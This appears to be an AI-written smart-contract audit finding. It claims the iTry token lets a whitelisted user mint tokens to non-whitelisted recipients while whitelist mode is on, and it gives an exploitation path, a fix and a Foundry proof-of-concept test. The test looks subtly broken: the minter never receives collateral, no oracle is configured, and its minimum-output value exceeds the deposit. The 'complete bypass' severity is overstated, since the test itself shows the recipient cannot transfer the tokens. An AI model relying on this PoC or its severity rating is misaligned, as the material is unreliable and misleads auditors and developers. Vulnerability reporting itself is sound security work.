## Title
Whitelist Enforcement Bypass During iTRY Minting in WHITELIST_ENABLED Mode

## Summary
The iTry token's `_beforeTokenTransfer` hook correctly prevents blacklisted addresses from receiving minted tokens. However, it fails to enforce whitelist requirements during minting when in WHITELIST_ENABLED state, allowing non-whitelisted addresses to receive iTRY tokens and violating the protocol's whitelist enforcement invariant.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/token/iTRY/iTry.sol` (function `_beforeTokenTransfer`, lines 201-202) [1](#0-0) 

**Intended Logic:** According to the protocol invariants, in WHITELIST_ENABLED state, "ONLY whitelisted users can send/receive/burn iTRY." This means all forms of receiving tokens—including minting—should require the recipient to be whitelisted.

**Actual Logic:** When the transfer state is WHITELIST_ENABLED, the minting case in `_beforeTokenTransfer` only checks that the recipient is NOT blacklisted, but does NOT verify that the recipient IS whitelisted. This is inconsistent with how normal transfers are validated, which require all parties to be whitelisted. [2](#0-1) 

**Exploitation Path:**
1. Protocol admin sets `transferState` to `TransferState.WHITELIST_ENABLED` to restrict token distribution to whitelisted users only
2. Alice (whitelisted user with `WHITELISTED_USER_ROLE` on iTryIssuer) deposits DLF collateral
3. Alice calls `iTryIssuer.mintFor(bob, dlfAmount, minAmountOut)` where Bob has no `WHITELISTED_ROLE` on the iTry token (but is not blacklisted) [3](#0-2) 

4. The `_beforeTokenTransfer` hook evaluates the minting condition: `hasRole(MINTER_CONTRACT, msg.sender) && from == address(0) && !hasRole(BLACKLISTED_ROLE, to)` - this passes because iTryIssuer has MINTER_CONTRACT role, from is address(0), and Bob is not blacklisted
5. Bob receives iTRY tokens despite not being whitelisted, violating the whitelist invariant

**Security Property Broken:** 
Invariant #3: "Whitelist Enforcement: In WHITELIST_ENABLED state, ONLY whitelisted users can send/receive/burn iTRY."

The word "receive" in this invariant should apply to ALL methods of receiving tokens, including minting, but the code only enforces whitelist for transfers, not minting.

## Impact Explanation
- **Affected Assets**: iTRY tokens can be minted to unauthorized (non-whitelisted) recipients
- **Damage Severity**: Complete bypass of whitelist controls during minting operations. Any whitelisted user can effectively distribute iTRY to non-whitelisted addresses by minting to them, defeating the purpose of WHITELIST_ENABLED mode
- **User Impact**: All protocol users are affected when whitelist mode is active. The protocol cannot enforce KYC/AML restrictions or regulatory compliance requirements that the whitelist is designed to enforce

## Likelihood Explanation
- **Attacker Profile**: Any whitelisted user with sufficient DLF collateral can exploit this
- **Preconditions**: 
  - Protocol must be in WHITELIST_ENABLED state
  - Attacker must have WHITELISTED_USER_ROLE on iTryIssuer contract
  - Target recipient must not be blacklisted (but doesn't need to be whitelisted)
- **Execution Complexity**: Single transaction calling `mintFor()` with target address
- **Frequency**: Unlimited - can be exploited continuously as long as preconditions are met

## Recommendation

In `src/token/iTRY/iTry.sol`, function `_beforeTokenTransfer`, lines 201-202, add a whitelist check for the recipient during minting:

```solidity
// CURRENT (vulnerable):
} else if (hasRole(MINTER_CONTRACT, msg.sender) && from == address(0) && !hasRole(BLACKLISTED_ROLE, to)) {
    // minting

// FIXED:
} else if (hasRole(MINTER_CONTRACT, msg.sender) && from == address(0) && !hasRole(BLACKLISTED_ROLE, to) && hasRole(WHITELISTED_ROLE, to)) {
    // minting - requires recipient to be whitelisted in WHITELIST_ENABLED mode
```

This ensures consistency with the normal transfer case which requires all parties to be whitelisted.

## Proof of Concept

```solidity
// File: test/Exploit_WhitelistBypass.t.sol
// Run with: forge test --match-test test_WhitelistBypassDuringMinting -vvv

pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/protocol/iTryIssuer.sol";
import "../src/token/iTRY/iTry.sol";

contract Exploit_WhitelistBypass is Test {
    iTryIssuer public issuer;
    iTry public itry;
    address public admin;
    address public whitelistedAlice;
    address public nonWhitelistedBob;
    
    function setUp() public {
        admin = makeAddr("admin");
        whitelistedAlice = makeAddr("whitelistedAlice");
        nonWhitelistedBob = makeAddr("nonWhitelistedBob");
        
        // Deploy and initialize iTry token
        itry = new iTry();
        issuer = new iTryIssuer();
        itry.initialize(admin, address(issuer));
        
        // Set to WHITELIST_ENABLED mode
        vm.prank(admin);
        itry.updateTransferState(IiTryDefinitions.TransferState.WHITELIST_ENABLED);
        
        // Whitelist Alice on iTry token
        vm.prank(admin);
        address[] memory users = new address[](1);
        users[0] = whitelistedAlice;
        itry.addWhitelistAddress(users);
        
        // Give Alice WHITELISTED_USER_ROLE on issuer (separate from iTry whitelist)
        vm.prank(admin);
        issuer.grantRole(issuer.WHITELISTED_USER_ROLE(), whitelistedAlice);
    }
    
    function test_WhitelistBypassDuringMinting() public {
        // SETUP: Verify Bob is not whitelisted on iTry token
        assertFalse(itry.hasRole(itry.WHITELISTED_ROLE(), nonWhitelistedBob), "Bob should not be whitelisted");
        
        // SETUP: Verify protocol is in WHITELIST_ENABLED state
        assertEq(uint256(itry.transferState()), uint256(IiTryDefinitions.TransferState.WHITELIST_ENABLED), "Should be in WHITELIST_ENABLED mode");
        
        // EXPLOIT: Alice mints iTRY to non-whitelisted Bob
        vm.prank(whitelistedAlice);
        uint256 mintAmount = 1000e18;
        issuer.mintFor(nonWhitelistedBob, 100e18, mintAmount);
        
        // VERIFY: Bob received iTRY tokens despite not being whitelisted
        assertGt(itry.balanceOf(nonWhitelistedBob), 0, "Vulnerability confirmed: Non-whitelisted Bob received minted iTRY");
        
        // VERIFY: Bob cannot transfer the tokens (transfer requires whitelist)
        vm.prank(nonWhitelistedBob);
        vm.expectRevert(IiTryDefinitions.OperationNotAllowed.selector);
        itry.transfer(whitelistedAlice, 1e18);
    }
}
```

## Notes

**Regarding the Original Question:** The specific question asked whether blacklisted addresses could receive minted tokens. The answer is **NO** - the code correctly prevents this through the check `!hasRole(BLACKLISTED_ROLE, to)` on line 201-202. [4](#0-3) 

Both in FULLY_ENABLED and WHITELIST_ENABLED states, blacklisted addresses cannot receive minted tokens, so blacklist enforcement works correctly for minting.

However, during the investigation of the `_beforeTokenTransfer` hook and minting logic, I discovered this related critical vulnerability: **whitelist bypass during minting**. This violates a different but equally important invariant (#3 - Whitelist Enforcement) and represents a High severity security issue that allows unauthorized token distribution when whitelist mode is active.

### Citations

**File:** src/token/iTRY/iTry.sol (L182-183)
```text
            } else if (hasRole(MINTER_CONTRACT, msg.sender) && from == address(0) && !hasRole(BLACKLISTED_ROLE, to)) {
                // minting
```

**File:** src/token/iTRY/iTry.sol (L201-202)
```text
            } else if (hasRole(MINTER_CONTRACT, msg.sender) && from == address(0) && !hasRole(BLACKLISTED_ROLE, to)) {
                // minting
```

**File:** src/token/iTRY/iTry.sol (L210-213)
```text
            } else if (
                hasRole(WHITELISTED_ROLE, msg.sender) && hasRole(WHITELISTED_ROLE, from)
                    && hasRole(WHITELISTED_ROLE, to)
            ) {
```

**File:** src/protocol/iTryIssuer.sol (L270-302)
```text
    function mintFor(address recipient, uint256 dlfAmount, uint256 minAmountOut)
        public
        onlyRole(_WHITELISTED_USER_ROLE)
        nonReentrant
        returns (uint256 iTRYAmount)
    {
        // Validate recipient address
        if (recipient == address(0)) revert CommonErrors.ZeroAddress();

        // Validate dlfAmount > 0
        if (dlfAmount == 0) revert CommonErrors.ZeroAmount();

        // Get NAV price from oracle
        uint256 navPrice = oracle.price();
        if (navPrice == 0) revert InvalidNAVPrice(navPrice);

        uint256 feeAmount = _calculateMintFee(dlfAmount);
        uint256 netDlfAmount = feeAmount > 0 ? (dlfAmount - feeAmount) : dlfAmount;

        // Calculate iTRY amount: netDlfAmount * navPrice / 1e18
        iTRYAmount = netDlfAmount * navPrice / 1e18;

        if (iTRYAmount == 0) revert CommonErrors.ZeroAmount();

        // Check if output meets minimum requirement
        if (iTRYAmount < minAmountOut) {
            revert OutputBelowMinimum(iTRYAmount, minAmountOut);
        }

        // Transfer collateral into vault BEFORE minting (CEI pattern)
        _transferIntoVault(msg.sender, netDlfAmount, feeAmount);

        _mint(recipient, iTRYAmount);
```
